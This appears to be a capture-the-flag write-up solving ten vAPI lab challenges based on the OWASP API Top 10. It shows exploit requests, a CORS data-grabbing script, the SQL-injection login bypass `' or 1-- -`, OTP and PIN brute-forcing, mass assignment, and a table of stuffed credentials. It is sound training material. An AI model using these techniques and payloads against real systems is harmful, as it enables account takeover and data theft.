
## API 1 [Broken Object Level Authorization]
> You can register yourself as a User , Thats it ....or is there something more?

Let's create a dummy account:

```json
Request => "POST http://{{host}}/vapi/api1/user"
{
    "username": "testuser",
    "name": "testname",
    "course": "testcourse",
    "password": "testpass"
}

Response =>
{
    "username": "testuser",
    "name": "testname",
    "course": "testcourse",
    "id": 30
}
```

Our user's ID is `30`. 
Let's retrieve our user's details:

```json
Request => "GET http://{{host}}/vapi/api1/user/30"

Response =>
{
    "id": 30,
    "username": "testuser",
    "name": "testname",
    "course": "testcourse"
}
```

Simillarly, we can check the admin user account's details by changing the user ID to `1`.
We have flag 1: `flag{api1_d0cd9be2324cc237235b}`

![[flag1.png]]

Simillarly, we can also update other user's details. Let's change the account details of the admin account. 

```json
Request => "PUT http://{{host}}/vapi/api1/user/1"
{
    "username":"pwned",
    "name":"pwned",
    "password":"pwned"
}
```

![[1-pwned-admin.png]]

This is a **BOLA** vulnerability. We can access (and even modify) objects we are not authorized to access.

---

## API 2 [Broken User Authentication]
> We don't seem to have credentials for this , How do we login? (There's something in the Resources Folder given to you )

We have credential dump with emails and passwords. The API does not have any form of rate limiting in the login. This is an example of Broken User Authentication. We can perform credential stuffing with each entry from the list using Burp Intruder's `Pitchfork` attack.
Attack output:

![[2-bruteforce.png]]

Found valid creds:

|           email            |       password        |
|----------------------------|-----------------------|
|   savanna48@ortiz.com      |       zTyBwV/9        |
|   hauck.aletha@yahoo.com   |       kU-wDE7r        |
|   harber.leif@beatty.info  |       kU-wDE7r        |


After logging in, we can check user details by making a request like:
```json
Req => "GET http://{{host}}/vapi/api2/user/details"
```

This gives us flag2: `flag{api2_6bf2beda61e2a1ab2d0a}`

![[flag2.png]]


---

## API 3 [Excessive Data Exposure]
> We have all been there , right? Giving away too much data and the Dev showing it . Try the Android App in the Resources folder

First we need to install the android app shared in the resources folder. We have to enter the base url of the vapi application. Enter the IP address of the device running the vapi.

![[3-base-url.jpg]]

We now need to configure the burpsuite proxy to be able to intercept the HTTP traffic on our android device. Follow up this tutorial by Portswigger [here](https://portswigger.net/support/configuring-an-android-device-to-work-with-burp).

After everything is configured, let's register a user:


![[3-register-user.jpg]]

![[3-login-burp.png]]

Now, login as the user. At first look, we see a few comments posted by the other users.

![[3-comments.jpg]]

However, when we check the intercepted traffic on burpsuite proxy, we see more than the comments data.

![[flag3.png]]

The application exposes it's users' sensitive information such as their location coordinates. We also find our flag 3 in the device ID of user baduser007.
Flag 3: `flag{api3_0bad677bfc504c75ff72}`

---

## API 4 [Lack of Resources & Rate Limiting]
> We believe OTPs are a great way of authenticating users and secure too if implemented correctly!

Let's say that we somehow got the phone number of one of the users. The phone number of that victim user is `8000000535`. Send the phone number to the login endpoint.

```json
Request => "POST http://{{host}}/vapi/api4/login"
{
    "mobileno":"8000000535"
}
Response =>
{
    "success": "true",
    "msg": "4 Digit OTP sent on mobile no."
}
```

Okay, there is an OTP protection. We have to submit the 4-digit OTP sent to the phone number to get authenticated. But we don't have access to that device.

Submitting any invalid OTP gives us "Invalid OTP" error message. We can try Burp's Intruder to brute force the OTP.

![[4-otp-bruteforce.png]]

We have successfully enumerated the correct OTP: `1872`.
Send this OTP from the Postman client.
Time for us to get the account details of the newly compromised user.

![[flag4.png]]

We get flag4: `flag{api4_ce696239323ea5b2d015}`

---

## API 5 [Broken Function Level Authorization]
> You can register yourself as a User. Thats it or is there something more? (I heard admin logins often but uses different route)

First, we create a user account by doing a POST request:

```json
Request => "POST http://{{host}}/vapi/api5/user"
{
    "username":"user",
    "password":"pass",
    "name":"John Doe",
    "address":"ABC",
    "mobileno":"9999999999"
}
Response =>
{
    "username": "user",
    "name": "John Doe",
    "address": "ABC",
    "mobileno": "9999999999",
    "id": 7
}
```
To retrieve the user's account details, we do the following request:

```json
Request => "GET http://{{host}}/vapi/api5/user/2"
Response =>
{
    "id": 2,
    "username": "user",
    "name": "John Doe",
    "address": "ABC",
    "mobileno": "9999999999"
}
```

It was mentioned above in the description that admins often use different routes. We can fuzz for possible endpoints:

![[5-fuzz-endpoints.png]]

The endpoint `/vapi/api5/users` looks promising. Let's send the request on our Postman client with the proper authorization headers.

![[flag5.png]]

We get all the users' details along with the admin user's account details which contain our flag 5: `flag{api5_76dd990a97ff1563ae76}`.

---

## API 6 [Mass Assignment]
>Welcome to our store , We will give you credits if you behave nicely. Our credit management is super secure

We start by creating a user account:

```json
Request => "POST http://{{host}}/vapi/api6/user"
{
    "name":"name123",
    "username":"user123",
    "password":"pass123"
}
Response =>
{
    "name": "name123",
    "username": "user123",
    "id": 2
}
```

We can retrieve our user's account details with the following request:

```json
Request => "GET http://{{host}}/vapi/api6/user/me"
Response =>
{
    "id": 2,
    "name": "name123",
    "username": "user123",
    "credit": "0"
}
```

There is an interesting property called `credit` whose value is 0. What if we could change the credit value??

Let's create another user and forcefully set the credit value to 9999999.

```json
Request => "POST http://{{host}}/vapi/api6/user"
{
    "name":"newname",
    "username":"newuser",
    "password":"newpass",
    "credit":"9999999"
}
Response =>
{
    "name": "newname",
    "username": "newuser",
    "id": 6
}
```

Now, when we retrieve the account details of this account, we see that the credits has been successfully set at the time of account registration. This is an example of Mass Assignment.

![[flag6.png]]

We also get our flag 6: `flag{api6_afb969db8b6e272694b4}`

---

## API 7 [Security Misconfiguration]
> Hey , its an API right? so we ARE expecting Cross Origin Requests . We just hope it works fine.

Let's first create a new user:

```js
Request => "POST http://{{host}}/vapi/api7/user"
{
    "username":"usser123",
    "password":"pass123"
}
Response =>
{
    "username": "usser123",
    "password": "pass123",
    "id": 2
}
```

We can access the user's authkey by making a GET request like this:
```js
Request => "GET http://{{host}}/vapi/api7/user/key"
Response =>
{
    "id": 2,
    "username": "usser123",
    "password": "pass123",
    "authkey": "1bf6f7e3e2af95b6bef129f9dd81c68078d9437b46ca7a13b292a2a6d1cd154d"
}
```

However, when we send a request with the `Origin` header, we also receive the flag contents.
Let's make a CORS exploit which automatically grabs the flag for us:
```html
<script>
	var xhr = new XMLHttpRequest();
	xhr.open('GET','http://192.168.29.147/vapi/api7/user/key');
	xhr.withCredentials = true;
	xhr.send()
	xhr.onreadystatechange = () => { alert(JSON.parse(xhr.response)["flag"]) }
</script>
```

I will host that page on port 9999. Since origin from different ports are considered different, the request originating from this script will be a cross-origin request. 
We don't have any live target user. So we can add our own cookie to the browser.
```
PHPSESSID=b2c9d5058ee32faab05a0de61575533b
```

Now, when we load the page, we get the flag displayed in the alert as shown below:

![[flag7.png]]

We get the flag: `flag{api7_e71b65071645e24ed50a}`

---

## API 8 [Injection]
> I think you won't get credentials for this.You can try to login though.

As the name suggests, we have to perform an injection attack. We are not given any login credentials. We get `IncorrectUsernameOrPassword` error when sending incorrect credentials. If we inject a single quote in either username or password, we get this specific SQL error:

![[8-sql-error.png]]

The login can be bypassed by using the payload `' or 1-- -` on either of the fields.
Now, we simply need to make another request to `http://{{host}}/vapi/api8/user/secret` to get the user's secret.

![[flag8.png]]

Flag 8: `flag{api8_509f8e201807860d5c91}`

---

## API 9 [Improper Assets Management]
> Hey Good News!!!!! We just launched our v2 API :)

We are given a username and we have to guess the pin
```js
Request => "POST http://{{host}}/vapi/api9/v2/user/login"
{
    "username":"richardbranson",
    "pin":"****"
}
```

The API implements the X-RateLimit header. There is rate limit protection of 5 requests.

However, we can also send a request to the `/v1` version of the API. This endpoint does not have any Ratelimit protection. We can use Burp intruder to brute force the pin.

![[flag9.png]]

Flag 9: `flag{api9_81e306bdd20a7734e244}`

---

## API 10 [Insufficient logging and monitoring]
> Nothing has been logged or monitored , You caught us :( !

There isn't anything to exploit

![[flag10.png]]

Flag 10: `flag{api10_5db611f7c1ffd747971f}`